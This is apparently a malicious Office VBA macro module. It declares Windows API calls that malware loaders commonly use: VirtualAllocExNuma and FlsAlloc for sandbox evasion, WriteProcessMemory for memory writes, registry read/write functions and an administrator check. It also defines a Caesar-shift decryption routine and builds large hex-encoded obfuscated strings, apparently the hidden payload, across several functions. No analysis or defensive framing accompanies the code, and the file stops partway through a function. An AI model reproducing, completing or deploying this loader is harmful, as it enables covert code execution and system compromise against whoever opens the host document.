public CQUYk As String
public reREC As String

#if VBA7 then
	Private Declare PtrSafe Function VirtualAllocExNuma Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long, ByVal nndPreferred As Long) As LongPtr

	Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal lpCallback As LongPtr) As Long

#else
	Private Declare Function VirtualAllocExNuma Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long, ByVal nndPreferred As Long) As Long

	Private Declare Function FlsAlloc Lib "KERNEL32" (ByVal lpCallback As Long) As Long

#end if

	Private Declare PtrSafe Function GetProcAddress Lib "KERNEL32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr

	Private Declare PtrSafe Function GetModuleHandleA Lib "KERNEL32" (ByVal lpModuleName As String) As LongPtr

	Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32.dll" (ByVal process_handle As LongPtr, ByVal base_address As LongPtr, _
	ByVal buffer As LongPtr, ByVal buffer_size As Long, ByVal bytes_written As LongPtr) As Long

	Private Declare PtrSafe Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hkey As LongPtr, _ 
	ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As LongPtr, ByRef phkResult as LongPtr) As Long

	Private Declare PtrSafe Function RegSetKeyValueA Lib "Advapi32.dll" (ByVal hKey As LongPtr, ByVal lpSubKey As String, _
	ByVal lpValueName As String, ByVal dwType As Long, ByVal lpData As String, ByVal cbData As Long) As Long

	Private Declare PtrSafe Function RegQueryInfoKeyA Lib "advapi32.dll" (ByVal hkey As LongPtr, ByVal lpClass As String, _
	ByVal lpcchClass As LongPtr, ByVal lpReserved As LongPtr, ByRef lpcSubKeys As LongPtr, ByRef lpcbMaxSubKeyLen As LongPtr, _
	ByVal lpcbMaxClassLen As LongPtr, ByVal lpcValues As LongPtr, ByVal lpcbMaxValueNameLen As LongPtr, ByVal lpcbMaxValueLen As LongPtr, _
	ByVal lpcbSecurityDescriptor As LongPtr, ByVal lpftLastWriteTime As LongPtr) As Long

	Private Declare PtrSafe Function RegGetValueA Lib "advapi32.dll" (ByVal hkey As LongPtr, ByVal lpSubKey As String, _
	ByVal lpValue As String, ByVal dwFlags As LongPtr, _
	ByVal pdwType As LongPtr, ByVal pvData As String, ByVal pcbData As LongPtr) As Long
	Private Declare PtrSafe Function SHGetFolderPathA Lib "shell32.dll" (ByVal hwnd As LongPtr, ByVal csidl As Long, ByVal hToken As LongPtr, _
	ByVal dwFlags As Long, ByVal pszPath As String) As LongPtr

	Private Declare PtrSafe Function IsUserAnAdmin Lib "shell32.dll" () As Long
Dim char_array_to_string As String

Function Ceasar_shift(char_array_to_string)
	Ceasar_shift = Chr(char_array_to_string - 5)
 End Function

Function Get_Three(char_array_to_string)
	Get_Three = Left(char_array_to_string, 3)
End Function

Function Get_String(char_array_to_string)
	Get_String = Right(char_array_to_string, Len(char_array_to_string) - 3)
End Function

 Function Decrypt(char_array_to_string)
	Do
		string_value = string_value + Ceasar_shift(Get_Three(char_array_to_string))
		char_array_to_string = Get_String(char_array_to_string)
	Loop While Len(char_array_to_string) > 0
	Decrypt = string_value
End Function

Function poQrVM
	CQUYk = CQUYk & "583B1921140B11174B2C0F11081A351B1C150B0E0D534C5C465B49582213080D1A534C1020171B4E4F51210A131B0D07214D101F0B16051A0E1A1652110E1061060B1E080F211A0B224E10050C1B0B0F07615C58645A49526D6E544B5F574D535437131F1B480B0D0F1F100B54170C0513480F230815151C0F1A4B05120B080F0A21060B464B506360736A4B4B544953474B2A4E3E390B0D07211715383014151C11210E050C50322F373F3A1C07070816211C0D381557625A52615B5A476144071A090B1114104D08100548411410080E0B400C1A1D1B52111A1B060F0E545050526D6E544B5F574D53543A0C0A0548401314054A2A0B0F085829"
	CQUYk = CQUYk & "12104B281005051F17085836100F4B2C160F1A0F4B2A210D13130D07584D53567071584A6453505058291B20130E066448310C1A1B21484110140C12545437161F161C0F1961582A151F09371B054847505D586D6E544B5F574D53542F14150512210861582C35304B5A632B1413181A1B4A53475D707E4A4858370C06070B204B2D170D0B5749331B0E1405495D837448544B4B542C1B0B0F073F1648455D707E4A48584E37171C090F175D837448545F380511120D370C051348400C1A1D3007070860562C1B0B0F073F164654370C05132A130A17211C1F57492A21060B400C1A1D280711170E062146542C1A050513120F243A11140F6049"
	CQUYk = CQUYk & "3564443D140D1C0F19213F301F0B16051A0E1A1652260817342816131008090F16093F154C5058465A5B45595F383014151C11210E050C50261F140F1C503C131A1205501A604D5B62061408494B526D6E544B4B585E3C131A12526D6E544B4B584A48582A0E1C054840241B1B5D46310F0C051B46542F0C22071B130608534C0521495D837448544B4B584A6453422A3C293C3342707E4A48544B4B584A481F1A1422074841241A0C05135970717F711B21140D194A351B1A171B0D5230140C191011211714151B5D6771747F15150B0D06583B1F2117082350320F176283746F6B181A1F1009543A2405160B074D390B101C0B100862311220"
	CQUYk = CQUYk & "0819211A350F19151F0B0B2162707E716F1F1A1422074841241A0C051346370810165D6771747F15150B0D06583B1F21170823502F2562707E716F1F1A1422074827140A060F1505051762370F065A594D6D6E67714B584A48544B4B5815150B0D06582D0F11190E050F0A204D290B1114104D250609130F160E06135D67714B584A48544B4B5815150B0D06582D0F11190E050F0A204D290B1114104D380C11140B17141B1B5D6771707E4A48544B4B584A48241809241105540A0F171B155429181F0E0C2B174B4E4A48400C1A1D4E482B370C0513736A4B4B584A48544B4B0D4A48544B4B584A485470717F716F39270F243113240E190C52"
	CQUYk = CQUYk & "4609081922051461594D1C0E14524F4B25051C280C1A0C2516220E19585D482019181B4E482F230C15163524080F2411120D4B605816161F0854336D6E6B747405160720140A580520200819224A2F06173B0C1C48251B08223A16050A08051B501F140D0C4A18220E0A1B1B15330A0A1B1B15484B09210F1454093422120B221417400912100F08644A0F06174B081C1111081A05310C4B62707E6D6E6B74423C0E142B101B211C1C4C490D0C0614084D07240E46484B3A1B1634131A173B1C1605194B534A1C221808644A2B1C0C0A0C3B180F0F0F1F100954604B0C1C1B0F544083746F6B1A1717160F114B0810160B220D4B2B3112205A59"
	CQUYk = CQUYk & "58301C31190817160B41080A0C11110653191B08482B0D17281616543A0815160F050D3317100C08084F58352F06175A464A2C0F1A1406050C330A0A1B1B15484B3422163820194B410C0E0F0A1737161C2214090B160B214F4B06050A543834221655624B3017220F07181025111E0F4F4B2B3112205A59583B0B111714211038130608281C1120080A0C1111064F4B2B3112205A59582914080E0A17160F050D2C0C16160B09180C0515484B3422163820194B3A11140F330C2206140F546283746F5470717F713D300F0F3F0D18051917604C1220070F24500C080F49644A350F172F171B1C2F1919211C632019181B51436771747F1B1C13"
	CQUYk = CQUYk & "1714154A0B1C17080610481F140D0C4A3220300C08380F0F162E1A3B0B1117142110502B0D17281616543A0815160F050D3317100C08084F583112203B17064A38220E0A1B1B152C0C0D1C0E0B484B191B08482B0D1728161654290C0505271007191B1B15484B3422163820194B2E05160529140C1B5454340D0C3A1C224B2A210D130B173A1F240B484B3422163820194B25050520140E222F0A0E1A080C4E48220805583112203B17064A3A0B081625111E0F4F4B0B1112204B3422120B2214173C1115240E1A1F160F050D4F58150F06174B370E14050A0C0C11110637240805545418142216483D140D455C38220E171B0B1C4B62707E6D"
	CQUYk = CQUYk & "6E6B74423C0E142B101B211C1C4C490D0C0614084D07240E46484B3A1B1634131A173B1C160519600C1C1B0F544083746F6B1A1717160F114B0810160B220D4B0B1112204B2D0C3512070C1B2A110B1D2E0525050520140E22522F06173B0C1C480C3B19210B5454340D0C3A1C224B09171B0B33070706515D6771707E716F39270F243113240E190C5246061707240E52100F0F564E482F230C15163524080F2411120D601706150B484B3A1B1634131A173B1C160519601A0914210854336D6E6B741A0C091C0B0A4B1B221C0F190D581112204B2D0C2B14051A08603112203B17064A102509111B0B1C4B62707E6D6E6B74423C0E142B101B"
	CQUYk = CQUYk & "211C1C4C49121B1C120F0F5A46500C080F49644A350F172F171B1C2F1919211C48574B1706150B4B40707E716F241809241105541A1717160F114B0810160B220D4B3F101C44171958270B202A18061C0B06173B060F050F1A1A60515D6771707E716F6B4227240E2F071B0E06165052120806100B085A59620614084954336D6E6B747405160720140A580520200819224A2F06173B0C1C4831190817160B42081021160B4013191B090C4C340D0C3A1C224B13281C1111081A054E482B0D17281616540F1B2C12160F0C0737161C2214090B160B214F4B0B1112204B07093B1C130A1225111E0F4F4B3F101C441719580E1841170C06162710"
	CQUYk = CQUYk & "07191B1B15484B3422163820194B241A3813190C23051C0F194F58150F06174B1C172522080C0C111106250F170715484B3422163820194B241A3C0C190817062F1054628374736A74742D2614083410080F162053491D051606080F455C52100F0F5651436771747F1B1C131714154A0B1C17080610481E0E141C4A3508080808521B0B0D1758061927140F2411150F0A0E2206154B62707E6D6E6B74423C0E142B101B211C1C4C49121B1C120F0F5A46500C080F495F3D736A747405160720140A580520200819224A3B2B0D17455C482E0F1A370E14050A533F101C441719580E18310C0F240C071112544D6D6E6771747F432C080F34231A"
	CQUYk = CQUYk & "1122175356130B220D08245B56524F4B351207223A080C4A63542A13171C350F174D3710150B4F4B3B220711173A08051408140D194A635417190B0554543A080C2E07211728061C11224B605816161F0854336D6E6B741A0C091C0B0A4B1B221C0F190D583112203B17064A290F173B060F0533070706051521533422163820194B202D1110180F1B4E482117191F1009541B19210B321310085F63736A70717F713D300F0F3F0D18051917604C0D0F190D1B0E55624D07240E46484B2A200916410817585D4831130C063B0B204D2C0B16114B40707E716F241809241105541A1717160F114B0810160B220D4B3F101C44171958270B20300E"
	CQUYk = CQUYk & "1C15140F330C2206140F531A0C1C0F06064B241A330507182405321310085F63736A70717F713D300F0F3F0D18051917604C0D0F190D1B0E55624D07240E464B40707E716F21170C0C11055408230C0516064B09210F145436191F160B44190E150515213008230F161B533422163820194B203A16050A08051B5454340D0C3A1C224B0F082C0721082C1C06160F1A1A644A061B17082D3D48081B290B080A0F194F583112205A595810350B2108644A111F174B3F101C441719580E182618101605162505290F160B2136191F161C0F0D544D6D6E6771707E716F6B70717F716F241809241105540E151B1C160B0708580C11050F4B3B220B11"
	CQUYk = CQUYk & "18171B524F6771747F711D6771747F712C1317082C11130F4B17474A6354270C0C053C0B10086230111D62707E716F6B3A0F1B05184C595B485A4F5970717F716F100E18160E0B541759585D48300C171B360F07084D420F19463A18161616130A176016574B4D37211607083A08150F12101A6283746F6B74141A521C624B5F5859525F54707E716F6B22707E716F6B74191B161B220D4B0C1C1B0F62707E716F6B20707E6D6E6771747F713B2B0D17455C4822081A0B0E1C54604B3A0E15330F0F210B502B0D17281616464108060F4F5970717F716F0B054B601C0B21180F0C4A63574B5B10282A2E25253A282A4B70717F716F1970717F71"
	CQUYk = CQUYk & "6F6B19080C1516064B1706150B5970717F716F1770718374736A74747F3112203B17064A07071A14310F15350C071C1C0B211A4B534A290F173B060F053307070605152153261B1633050718240530130D07240550520C10051152100F0F56515454492C231B0F251B08223B0B211A142110464B62707E716F6B090E210E481D1B10311C0B2018192263736A74747F110A4C340D0C3A1C224D3A1F240B54606058624F6771747F711D6771747F716F1224171B4343541B0C0C0B103509181A4A63540D08094A061B17082D5B4354225B105660484B5B105B57484B5B102B581762707E716F6B743422163820194B21151C3516191F161C0F0D62"
	CQUYk = CQUYk & "83746F6B7474091A133519080C1516064B605837160B1708281C1111081A052D0B070E190F52290F172A0B1C160F0D17281C1111081A05524F484B0C231B0F350E1A31090C101908051B54541B0C0C0B103509181A4E48240C17151241121805622E0B060617204E48051817580F1B203E1606111C20080D5F63736A74747F711924103E06051C1F190D585D483D19140C0538220E0A1B1B15270810211C1F4C26080C2B1B221908221638220E0A1B1B154C544F58522F06173B0C1C4F4C53383F101C5E5754170D150B3E0E053F071007191B1B1554524B4B5154541B0C0C0B103509181A4E48240C17151241121805622E0B060617204E4805"
	CQUYk = CQUYk & "1817580F1B203E1606111C20080D5F63736A74747F1D736A74747F051421084B1F08502B0D17281616463A140E054857604B4C51736A74747F23736A74747F71061B17082D3D48240C17151241121805585D48060816580C1F200842463D48195B23455954545B23355A23594B707E716F6B743422163820194B21151C3516191F161C0F0D6283746F6B7474091A133519080C1516064B605837160B1708281C1111081A052D0B070E190F52290F172A0B1C160F0D17281C1111081A05524F484B533F101C4417195F52503F340D0C5B564B0C10051141051A3E17060C22081A054A4D546354644A1813170A203F061F054F581A07200A13310C"
	CQUYk = CQUYk & "1B0E4D2F1B100920134F580F1B204B0E0B16411D19140C160B06546283746F6B7474091A133519080C1516064B605837160B1708281C1111081A052D0B070E190F52290F172A0B1C160F0D17281C1111081A05524F484B533F101C4417195F52503F340D0C5B564B0C10051141051A3E17060C22081A054A4D545C585F4E48240C17151241121805644A1813170A203F061F054D4405120D1713644A111F174B21151C3516191F161C0F0D544D6D6E6B7474136D6E6771707E716F6B70717F716F4117191F100939404B3B1619352518220B1C0B0E0D054A63540D08094A1520191422073D60406283746F6B74280C17412E180D15160F050D1A"
	CQUYk = CQUYk & "2D5A4354604B56251C1D2D0E0C110A0B0A0C0C11110639081911152008195663736A74747F251C1D3E250B100520140E221B3D63404B534A462F17163B180B0617391B070F211708064C5D6771747F712B20163E3A1512111714211015395940585D4852281709251A0F0D17291C0F2008494D6D6E6B74743B1619352518220B1C0B0E0D054355374B60584C2B2016280A05122036191F160B2E180F244C5D6771747F712F06173B0C1C480F171631090C101908051B48574B3422163820194D2E05160562707E716F6B340D0C3A1C224B090F160B213E1606111C20080D585D482B0D17281616464108060F5D6771747F710F0E4B533F101C44"
	CQUYk = CQUYk & "1719623B0F1A084B535D485C54707E716F6B22707E716F6B74090F160B39404B1B1619351B0C0C0B1054604B2205195409240C053D5C404B0D4A581C5763644A581C5A5A644A581C2A5B644A581C2A5A644A581C5B5B644A581C5B5B644A581C5B5B644A581C5B5B581D5D6771747F716F6B050E064A500B0D17581348574B5B4D4A0D545F4B3B1619352518220B1C0B0E0D0550340F0D060C125D5412525D51736A74747F716F1970717F716F6B74741B1619350C071C1C0B211A4B534A290F173B060F053307070605152153261B1633050718240530130D07240550520D171C0E1446070F244C4F484B280C17412E180D15160F050D1A2D13"
	CQUYk = CQUYk & "434B62707E716F6B74747F1718073E191B161B220D4B534A392214171B3A16050A08051B330F100E0621502D081735151622080D0C3A16050A08051B504B4F4B1B1619350C071C1C0B211A4F58051C1D3E1B1716050C4F4B504E48051817580C1F20081A3117160B17171B104F5970717F716F6B742083746F6B7474136D6E6B74747F05142108707E716F6B742283746F6B74747F0C1F200842334A0B20163E08091C11134B534A120F164B16211C0F4263334A1D545B23455954545B23355A54545B23355B54545B23485A54545B23485A54545B23485A54545B23485A54545B23485A481762707E716F6B74741A0F16545314221648094B60"
	CQUYk = CQUYk & "585A5D54124B544A2B20163E3A1512111714211015462F0822071C0C624B1D534D4B70717F716F6B742283746F6B74747F710B20163E17060C22081A054A635426080C3A16050A2C1C06160F1A1A60270B20300E1C15140F330C2206140F534922160C080F4D1C0E1452544F58251C1D3E250B100520140E221B3D0940544D6D6E6B74747F716F1D1B10311C0B201819224A635436191F160B44190E150515213008230F161B53261B16251F19191B101C44190E150515215354644A0B20163E17060C22081A054E480F1716311A07200A13644A60484B0E0B16481224171B1B411D19140C160B06546283746F6B74747F1D736A74747F712367"
End Function 
Function dhLPQBL
	CQUYk = CQUYk & "71707E6D6E6B747416211C0F4240580C1B0E4B6058100B1D4B090F160B3956564C3D48195B234F6254545B23455B54545B233B2954545B234F2B54545B234F2954545B234F5A54545B23376254545B234A2C54545B234A2C54545B23496254545B23466154545B23455754545B23455B54545B23452C54545B23456154545B234C5A54545B234B6154545B23365854545B23482854545B23455B54545B233A5C54545B23465854545B23482954545B23455A54545B233B6154545B23456154545B23505B54545B234C5A54545B233A5B54545B23455854545B234B5654545B23452B54545B23455554545B234C5B54545B234B6154545B233728"
	CQUYk = CQUYk & "54545B23462B54545B233A5C54545B23476154545B23466254545B23455C54545B23495954545B233C2654545B23455954545B23455954545B234C5A54545B234B6154545B23376254545B23356254545B234B2854545B23482B54545B23475654545B234A2B54545B234B5654545B234B5654545B23462B54545B23372B54545B23362854545B234A2654545B23465754545B23495B54545B23372B54545B23506154545B23375B54545B23452B54545B23455A54545B233B6154545B23456154545B234C2C54545B233A2654545B23462B54545B234A5654545B23462B54545B234A2B54545B23362C54545B23455754545B23456154545B23"
	CQUYk = CQUYk & "482954545B233A5B54545B23465B54545B23505B54545B23492654545B234A2B54545B23495954545B233B2854545B23476154545B234A2C54545B23496254545B234A2954545B233B2654545B233A5654545B233A5B54545B234A2C54545B23496254545B234A2954545B23455A54545B233B2854545B23372C54545B23475754545B23476154545B23455C54545B234A5754545B23355654545B23465754545B233A5C54545B23456254545B234C2954545B23456254545B23462C54545B234A2B54545B23362C54545B233A2654545B23455C54545B23505A54545B234F5954545B23455554545B23455A54545B234C5754545B2336595454"
	CQUYk = CQUYk & "5B23455A54545B234F5554545B23365654545B23462B54545B233A2654545B234B5854545B233A5A54545B23462B54545B234A2B54545B23365554545B234C5A54545B234B6154545B23376254545B23356254545B23462B54545B23372B54545B23362854545B234A2654545B23465754545B23495B54545B23372B54545B234A5B54545B234F6254545B23475554545B234F5754545B23466254545B234A2954545B23462854545B234B2B54545B23495C54545B23462C54545B234B2C54545B23362B54545B23476254545B23365A54545B234C5C54545B23462B54545B233B6154545B23462C54545B234C5754545B23452854545B234A61"
	CQUYk = CQUYk & "54545B23366254545B23482554545B23462B54545B233A5C54545B23505654545B23455C54545B23462B54545B233B6154545B23462C54545B23492854545B23452854545B234A6154545B23366254545B23455B54545B233A5C54545B234A5754545B23485A54545B23455C54545B234A5754545B23355654545B23462B54545B234C5B54545B23455754545B234C5C54545B234C5C54545B23452C54545B234C5954545B23462B54545B23455A54545B23466154545B23452854545B23455B54545B234C5954545B23455B54545B233A5554545B23502554545B234C6254545B23455B54545B23456154545B234F2554545B234F6254545B23"
	CQUYk = CQUYk & "4C5C54545B23465754545B23452C54545B234C5954545B23455B54545B233A2654545B23492B54545B23502854545B23466154545B234F2554545B234F2554545B234F5954545B23452654545B23455A54545B234A5B54545B23355C54545B23452954545B23452854545B233B5A54545B23476154545B23482C54545B23482654545B23475654545B23465C54545B23485554545B23472B54545B23495654545B23462B54545B23455554545B234C5A54545B233A5954545B23505754545B23462C54545B23375854545B23376154545B234C5654545B23475754545B234C2954545B234A2654545B234F2554545B23366254545B2346555454"
	CQUYk = CQUYk & "5B23452C54545B23455A54545B233B2C54545B23502B54545B23452954545B23462554545B23462654545B234B5754545B23365654545B23455A54545B234B2B54545B23362854545B23452C54545B23455554545B23462C54545B233B5954545B234A5954545B23462954545B23465954545B23356154545B23495654545B234A2C54545B234A2C54545B23496254545B234F2854545B23362C54545B23502B54545B234A2654545B234A2C54545B23496254545B234A2954545B234B5754545B234B2C54545B234B6154545B234C2654545B234C5754545B234B6254545B234A5A54545B234C5854545B234B5754545B234A5654545B234A5C"
	CQUYk = CQUYk & "54545B234B5754545B234B6154545B23495654545B234C5954545B23455B54545B233A2854545B23376154545B23462854545B23372654545B23372C54545B233B5C54545B23495754545B234A2954545B234A6254545B23465754545B234B2B54545B23365654545B23465554545B23452C54545B23482554545B23495954545B23452954545B23455654545B23352554545B23455754545B233B2854545B233A5554545B23375554545B234A2C54545B23496254545B234A2954545B234A6254545B234F5554545B23366254545B234F5B54545B23365654545B234A2954545B234A6254545B23495654545B234C2554545B23475C54545B23"
	CQUYk = CQUYk & "485554545B23455654545B234B5554545B23472854545B234B6254545B234B6254545B23475A54545B23456154545B234B2854545B23482854545B23462554545B234B2C54545B23465954545B23452854545B23455754545B234B2554545B234B5554545B23462854545B23465554545B234C2654545B23455754545B23472854545B234B5A54545B23476254545B23475754545B23466154545B23455A54545B23452654545B234B5754545B23452B54545B23462C54545B23465954545B23452854545B23485854545B23452554545B23486154545B234C5B54545B23472C54545B23472554545B23465554545B23465B54545B2347615454"
	CQUYk = CQUYk & "5B234C2954545B23466254545B234B5754545B23466254545B23466154545B234B6154545B23475854545B23475B54545B23462C54545B23482B54545B234B6154545B23452954545B23455754545B23466154545B23485554545B23485554545B23462954545B23482554545B23482554545B234B6254545B23455554545B23475B54545B23476254545B234A5B54545B23455954545B23455754545B23475A54545B234B2B54545B23475A54545B23482654545B23482B54545B23466254545B234C5954545B23485554545B23455A54545B23475754545B234C5554545B23462554545B23462954545B23462654545B23482954545B234555"
	CQUYk = CQUYk & "54545B23475554545B23475854545B23475B54545B234B2554545B23472954545B23472954545B23465554545B23455954545B23475854545B23472B54545B23472954545B23452554545B23452C54545B234B5554545B23455854545B23472854545B23455854545B23455B54545B23465754545B23465C54545B23462954545B23462554545B234B2B54545B23456154545B23486154545B23476154545B23482B54545B234B2554545B23465554545B23466254545B23485854545B23462554545B23486154545B23452954545B23486154545B23452554545B23452554545B23465954545B23455654545B23485554545B234C5654545B23"
	CQUYk = CQUYk & "455C54545B234C2C54545B23452854545B23475854545B23465654545B23475A54545B23482B54545B234C5854545B23472954545B23455754545B23452B54545B23475754545B23455A54545B234A5B54545B23475854545B23475A54545B23465554545B234B5854545B23485754545B234C2954545B23455654545B234B2B54545B23465A54545B23466254545B23462954545B23462B54545B23452C54545B23455554545B23485854545B23486254545B23455554545B23485754545B23475954545B23472C54545B23465A54545B23465854545B23475854545B234C2C54545B234A5C54545B23475954545B23462954545B2347295454"
	CQUYk = CQUYk & "5B23455C54545B23485754545B23486254545B23455754545B23475954545B23486254545B234A5B54545B234C6254545B23462554545B234B6154545B23452854545B23452B54545B234B5554545B234C5C54545B23465554545B23466154545B234B2854545B23455754545B234B5854545B23485754545B23462854545B234C5A54545B23455954545B23456154545B23455B54545B23465C54545B23472C54545B23452554545B23482B54545B23455754545B23462554545B234C5A54545B23465754545B23455C54545B23475954545B234C5B54545B23465954545B234C5B54545B234B6154545B23466154545B23455C54545B234C59"
	CQUYk = CQUYk & "54545B234B2954545B23485854545B23472B54545B234B2B54545B234C5654545B23475C54545B23485754545B23472854545B234A2954545B23455A54545B233B2C54545B23372B54545B23452954545B23462554545B23466154545B234C5A54545B23465754545B234B2B54545B23365654545B23465554545B23455C54545B233B5A54545B23495654545B234B6154545B233C5B54545B233A2B54545B234A2954545B234A6254545B23495654545B234A2C54545B23452C54545B23465554545B23452C54545B23462854545B23372654545B23376154545B234F5C54545B23462C54545B234B5A54545B234B2654545B234F5554545B23"
	CQUYk = CQUYk & "366254545B23455B54545B233A2854545B23376254545B23482554545B234A2954545B23452554545B23455B54545B233A2854545B234F6154545B23482554545B23495554545B234C5954545B23456154545B23465A54545B233B2954545B234B5554545B23495654545B234A2C54545B23455654545B233A2854545B23502954545B23482554545B23495A54545B23462B54545B234C5654545B23452854545B233B5654545B23472C54545B23462554545B233A2654545B233B5554545B23496254545B234A2954545B234A6254545B23495654545B234F2554545B23366254545B234C5B54545B234B6154545B23376254545B234C595454"
	CQUYk = CQUYk & "5B234C5954545B23455B54545B233A2854545B234F6154545B23455B54545B234A5B54545B23365654545B23455A54545B234C5754545B23365954545B23455554545B234C5954545B23455654545B23375854545B23365854545B234C2654545B234A2954545B23492B54545B23465C54545B234F2554545B23372C54545B233B5554545B23376254545B23472854545B23492554545B23455B54545B23366154545B23376154545B233A5A54545B23505954545B234A2C54545B234A2C54545B23452854545B233B5654545B23462B54545B23375654545B234B6254545B23502C54545B23496254545B234A2954545B234A6254545B234956"
	CQUYk = CQUYk & "54545B234F2554545B23366254545B234C5A54545B234F2854545B23365954545B23465A54545B234A6154545B234F5C54545B233C2554545B234F5C54545B23452C54545B23495654545B234A2C54545B234A2C54545B23465554545B234C5954545B23482554545B23455654545B234C5954545B23455654545B233A2854545B23366154545B23375754545B234F5C54545B23492C54545B23455654545B23366154545B23372954545B234A6254545B23505654545B234A2C54545B234A2C54545B23452854545B233B5654545B234C5A54545B233C5A54545B23452954545B23506254545B23496254545B234A2954545B234A6254545B23"
	CQUYk = CQUYk & "495654545B234F2554545B23366254545B234C5A54545B233A2C54545B23455554545B234C5954545B23455B54545B233A5654545B234F6154545B23455C54545B233B2854545B23375B54545B23455B54545B233A5654545B23372554545B23455954545B23376154545B23365654545B234A2C54545B234C2C54545B23496254545B234A2954545B23462854545B233B2C54545B23375654545B23455654545B23352554545B23492B54545B233A2954545B233B2C54545B23506154545B234A2C54545B23496254545B234A2954545B234A6254545B234F5554545B23366254545B23455B54545B233A5554545B23375854545B234C625454"
	CQUYk = CQUYk & "5B233B2854545B23372C54545B23475754545B23355854545B23486254545B233B2654545B234A2654545B23455B54545B234A2B54545B23365554545B233B5554545B23376254545B23472854545B23366154545B234C5B54545B23365554545B234C5C54545B23482554545B23495654545B234C5654545B233B5C54545B234F6254545B23492654545B234C2554545B234A2954545B23462B54545B233A5654545B23372554545B234F2854545B23362C2359707183746F6B7405211C500B0D17581148574B5B4D4A0F545F4B16150A462F0822071C0C624B1F534D4B70717F716F1970717F716F6B09181A430F374B605852061B17085F52"
	CQUYk = CQUYk & "504C181422164F1218052D114354504B4B51484E4B5B10282A4B62707E716F6B20707E6D6E6771707E716F6B1A170611120D4B121B2148574B4921080A21080A5663736A74747F0C1F200842334A0D0F243E16211C0F1A4B534A351B1A171B0D524008230C502B060A0E1C11120D4D382C28604626080C2C1F20081A60130B1B546283746F6B7405211C500B0D17581348574B5B4D4A0D545F4B16150A462F0822071C0C624B1D534D4B70717F716F1970717F716F6B09181A430D374B605852061B17085F52061F05421D3D48364B121B21411224171B1B3D094B4858130B1B4D2F1B10092013405F63736A74747F1D736A70718374736A7474"
End Function 
Function LNsCF
	CQUYk = CQUYk & "7F1B1C22140D194A18220E0A1B1B1535140D1E050520140E223F1C1319061B1648574B4905060F13060D200F152049628374736A70717F716F6B3B19210B0B211A4B081C1111081A053F1C053E1422140B11173E1F101C054B6058100B1D4B3B060F050F1A1A60515D6771747F716F24190E150515213E17213F0F0611081516410B0D17215035200C190C31120E0E4D3A11140F2D0C230548574B1B060F050F1A1A3111120A080A0C1111063E17171C090F176283746F6B7474081C1111081A053F1C053E1422140B11173E1F101C054D3A0C091620340D1A0F5231190817160B260E361F100C05164B534A1C2218084D6D6E6B74747F1A1605"
	CQUYk = CQUYk & "0A08051B41200E3E1F100E0F0A17311112200E4D2516072217342208114636142206111D3A170F0E0B54604B281C1111081A05370F06070E093B1C1B0F0862320F1007082263736A74747F7118220E0A1B1B1535170E3111120A080A0C3F0F06170E623B1C13191760515D6771747F716F454E3B262F252F3A3A31313241372C422B2B353A37373C3C67714B584A48544B4B584A48544B4B584A486771747F712F06173B0C1C480C3B19210B0B211A4B534A3124080D281C1111081A0552581C5B5B4728582E2525644A0A130F1A1B4E4824190E150515213E17213F0F0611081516410B0D1721502F1054628374736A70717F716F2B0D172816"
	CQUYk = CQUYk & "165409181A3F150B2108585D484C340D0C3A1C2254090B085228080D19161059707183746F6B743422163820194B25050520140E22320706070F1B4A6354340D0C3A1C224D411B1C115970717F716F1F140D0C4A331323142315134114211B4A6354595B4C625D6771747F711B0B0D17583B2B313E2A412D332B374B534A581C5B63485A58645B5B4D6D6E6B74740B1112204B3A3B2B3C2B2E2D312D27443E3626313C2F4B60585A20645B5B4663736A74747F150F06174B25252540342E423F33333B3E262527304B60585A20645B5B4C63736A74747F150F06174B25252540342E423F33333B3E3B422B3138373B4A63545B23485A585C6270"
	CQUYk = CQUYk & "7E716F6B1814221648442C263B3F2B3C282A2B362B3539283726394234373B4A63545B234C5A5D6771747F711B0B0D17583B2B313734413041332F2F31292531283A254A63543A2835362F252D3E4329383536393F362B541F4B25252540342E423F33333B3E262527304B1F583B2B313734413041272C3B3125402F2A382C255D6771707E716F6B181422164811190817160B351A0815160F050D3E06051C1F190D585D4826172A06050720083A1B0B1C0B0E0D601C0B0E4B3A1B0B1C0B0E0D400912100F08644A352F2A373F2F32352C2F443F27312A28253B5454340D0C3A1C224D411B1C11484B191B0848270C231F0D1B073A140E055454"
	CQUYk = CQUYk & "3B2C3925412F432835353C2F3E393B292C3D39342C2554543A28353F252530303F36542B0D17281616464108060F4F59707183746F6B743422163820194B17060C224B60583112203B1706503E0F190E4D6D6E6B74743F101C44171958100B1D3E1B060F050F1A1A31090C10194B534A2F06173B0C1C523A08192163736A74747F352F06175A464A1A0B081631060F211B0E05111C0B0E0D585D486362707E716F6B3834221655624B0C240E11110C171F0F12351724080548574B5B4D6D6E6771747F711B0B0D17580D07243E151F05193519080C1516064B6058301C270C1B2A110B1D2E0525050520140E2252350F0A171F0F122C0C0D1C0E"
	CQUYk = CQUYk & "0B484B261B16251F19191B101C44190E150515215354644A160F054B220519351B19210B0B211A3E17060C224F4B603112203B17065158484B533F101C4417195F5A54545334221638201954484E48220805580C1B0E3E1A1F240B484B151F0519350714051A112114171F0F12484B0C240E11110C171F0F12351724080554543B2C3925412F432835353C2F3E393B292C3D39342C254F59707183746F6B7430171C150C0C0F622B1124245316150A484B5B644A120F163E081C1111081A053F07100719644A061F054D4405120D17135F63736A70717F716F070C1B31180F0F163E06051C1F190D585D48261730171A3A0B08164108350F0A17"
	CQUYk = CQUYk & "1F0F124C3A0815160F050D3317100C08084F581238220E0A1B1B15484B191B0848130707064E484C340D0C3A1C22545B644A502B0D172816164B5B4F58522F06173B0C1C4F644F4B06050A5409181A3F150B2108644A1A0B081631060F211B0E05111C0B0E0D644A07080F0E15091C0B0E0D31161F24084F583A272D283E3B422B3138373B3F362F2C27293C2F4028544D6D6E6771747F711B0B0D17581512070C1B311C0B201819224A63542D172B1013131B351F051925053A1B0B1C0B0E0D603B0B111714211030130D07240554540D08093F18220E0A1B1B15350C071C1C4F59707183746F6B741422164806170A240F150F3E191B161B22"
